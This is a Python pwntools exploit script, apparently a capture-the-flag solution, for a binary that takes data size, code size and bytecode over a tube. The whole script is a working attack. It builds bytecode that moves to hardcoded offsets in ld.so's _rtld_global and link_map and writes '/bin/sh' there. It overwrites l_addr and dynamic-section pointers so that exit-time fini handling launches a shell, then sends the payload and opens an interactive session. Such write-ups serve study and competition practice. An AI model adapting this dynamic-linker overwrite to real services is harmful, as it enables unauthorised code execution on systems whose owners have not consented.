#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


payload = b""


def go_forward(distance):
    global payload
    payload += b"@"
    payload += p32(distance)


def next_byte():
    global payload
    payload += b">"


def next_long():
    global payload
    payload += b"+"


def change_byte(data):
    global payload
    lg("data", data)
    payload += b"."
    payload += p8(data)


def edit(data):
    global payload
    for i in range(len(data)):
        change_byte(data[i])
        next_byte()


DT_FINI = 13
DT_INIT = 12
DT_FINI_ARRAY = 26
_rtld_global_to_chunk = 0x323060
arg0 = _rtld_global_to_chunk + 2312
l_addr = 0x324190


go_forward(arg0 - 0x10)
edit(b"/bin/sh\x00")
go_forward(l_addr - arg0 - 8)
edit(p8(0xE0))
go_forward(0xA8 - 1)
edit(p8(0xA8))
go_forward(0x68 - 1)
edit(p64(0))

payload += b"q"

ru(b"Pls input the data size\n")
sl(i2b(0x100000))
ru(b"Pls input the code size\n")
sl(i2b(0x100))
ru(b"Pls input your code\n")
s(payload)

ia()
